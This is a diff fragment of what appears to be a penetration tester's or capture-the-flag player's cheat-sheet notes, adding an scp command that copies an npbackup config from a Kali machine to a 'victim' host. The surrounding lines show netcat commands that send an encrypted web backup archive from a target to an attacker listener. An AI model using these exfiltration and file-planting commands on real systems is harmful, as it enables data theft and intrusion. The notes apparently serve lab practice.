@@ -38,6 +38,9 @@ nc 10.10.14.7 5555 < web_20250806_120723.zip.aes
 nc -lvnp 5555 > web_20250806_120723.zip.aes -> your machine
 ```
 
+# Copy file Kali to Victim
+`scp npbackup.conf marco@10.10.11.82:/tmp/npbackup.conf`
+
 
 # Beautify CLi
 
